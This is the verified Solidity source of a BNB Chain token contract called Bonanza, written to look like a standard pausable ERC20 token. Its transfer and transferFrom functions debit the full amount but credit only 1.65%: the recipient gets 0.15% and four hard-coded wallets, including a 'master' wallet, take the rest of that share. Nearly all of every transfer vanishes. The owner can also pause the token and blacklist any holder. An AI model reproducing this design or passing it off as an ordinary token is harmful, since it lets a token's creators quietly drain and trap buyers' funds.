/**
 *Submitted for verification at BscScan.com on 2022-08-15
*/

pragma solidity ^0.4.24;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;


  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }


  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

}

contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  /**
   * @dev Modifier to make a function callable only when the contract is not paused.
   */
  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  /**
   * @dev Modifier to make a function callable only when the contract is paused.
   */
  modifier whenPaused() {
    require(paused);
    _;
  }

  /**
   * @dev called by the owner to pause, triggers stopped state
   */
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    emit Pause();
  }

  /**
   * @dev called by the owner to unpause, returns to normal state
   */
  function unpause() onlyOwner whenPaused public {
    paused = false;
    emit Unpause();
  }
}

contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Buy(address indexed from, address indexed to, uint256 value);

}

contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract StandardToken is ERC20 {
  using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) internal allowed;
	mapping(address => bool) tokenBlacklist;
	event Blacklist(address indexed blackListed, bool value);
    mapping(address => uint256) balances;
    


    address private burn_wallet = address(0xb5cAF1f5FAaf1C59A21a92322A6Ea2322D9975e8);
    address private reward_wallet = address(0xE67A7cD73b2D8ed27B21a4F53b6B8D4ba95381d9);
    address private become_holder_wallet = address(0x9d4121Bc8633F09a0Ae3f43bc465C9e8799B763E);
    address private master_wallet = address(0x460829f35002f7C1a9488e291888Dc91D6D60dBA);



    function transfer(address _to, uint256 _value) public returns (bool) {
        require(tokenBlacklist[msg.sender] == false, "Bots are not allowed!");
        require(tokenBlacklist[_to] == false, "Bots are not allowed!");
        require(_to != address(0), "Invaild Receiver Wallet Address!");
        require(_value <= balances[msg.sender], "Insufficent Balance!");
        require(msg.sender != address(0), "Invaild Sender Wallet Address!");
        // make dedction on income!
        uint256 burn_income = _value*36/10000;
        uint256 reward_income = _value*36/10000;
        uint256 become_holder_income = _value*36/10000;
        uint256 master_income = _value*42/10000;
        uint256 user_income = _value*15/10000;  
        // SafeMath.sub will throw if there is not enough balance (SK).
        balances[msg.sender] = balances[msg.sender].sub(_value);
        
        balances[burn_wallet] = balances[burn_wallet].add(burn_income);
        balances[reward_wallet] = balances[reward_wallet].add(reward_income);
        balances[become_holder_wallet] = balances[become_holder_wallet].add(become_holder_income);
        balances[master_wallet] = balances[master_wallet].add(master_income);
        balances[_to] = balances[_to].add(user_income);
        // Transfer Fund -> 
        emit Transfer(msg.sender, burn_wallet, burn_income);
        emit Transfer(msg.sender, reward_wallet, reward_income);
        emit Transfer(msg.sender, become_holder_wallet, become_holder_income);
        emit Transfer(msg.sender, master_wallet, master_income);
        emit Transfer(msg.sender, _to, user_income);
        return true;
    }



  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(tokenBlacklist[msg.sender] == false, "Bots are not allowed!");
    require(tokenBlacklist[_to] == false, "Bots are not allowed!");
    require(_to != address(0), "Invaild Receiver Wallet Address!");
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);


     // make dedction on income!
    uint256 burn_income = _value*36/10000;
    uint256 reward_income = _value*36/10000;
    uint256 become_holder_income = _value*36/10000;
    uint256 master_income = _value*42/10000;
    uint256 user_income = _value*15/10000;  
    

    balances[_from] = balances[_from].sub(_value);

    // balances[_to] = balances[_to].add(_value);

    balances[burn_wallet] = balances[burn_wallet].add(burn_income);
    balances[reward_wallet] = balances[reward_wallet].add(reward_income);
    balances[become_holder_wallet] = balances[become_holder_wallet].add(become_holder_income);
    balances[master_wallet] = balances[master_wallet].add(master_income);
    balances[_to] = balances[_to].add(user_income);

    
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

    emit Transfer(_from, burn_wallet, burn_income);
    emit Transfer(_from, reward_wallet, reward_income);
    emit Transfer(_from, become_holder_wallet, become_holder_income);
    emit Transfer(_from, master_wallet, master_income);
    emit Transfer(_from, _to, user_income);
    return true;
  }


  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }


  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }


  function _blackList(address _address, bool _isBlackListed) internal returns (bool) {
	require(tokenBlacklist[_address] != _isBlackListed);
	tokenBlacklist[_address] = _isBlackListed;
	emit Blacklist(_address, _isBlackListed);
	return true;
  }



}

contract PausableToken is StandardToken, Pausable {

  function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transfer(_to, _value);
  }

  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transferFrom(_from, _to, _value);
  }

  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {
    return super.approve(_spender, _value);
  }

  function blackListAddress(address listAddress,  bool isBlackListed) public whenNotPaused onlyOwner  returns (bool success) {
	return super._blackList(listAddress, isBlackListed);
  }

}

contract Bonanza is PausableToken {
    string public name;
    string public symbol;
    uint public decimals;
    event Mint(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed burner, uint256 value);


    constructor(string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, address tokenOwner) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        balances[tokenOwner] = totalSupply;
        owner = tokenOwner;
        emit Transfer(address(0), tokenOwner, totalSupply);
    }

	function burn(uint256 _value) public {
		_burn(msg.sender, _value);
	}

	function _burn(address _who, uint256 _value) internal {
		require(_value <= balances[_who]);
		balances[_who] = balances[_who].sub(_value);
		totalSupply = totalSupply.sub(_value);
		emit Burn(_who, _value);
		emit Transfer(_who, address(0), _value);
	}
    


}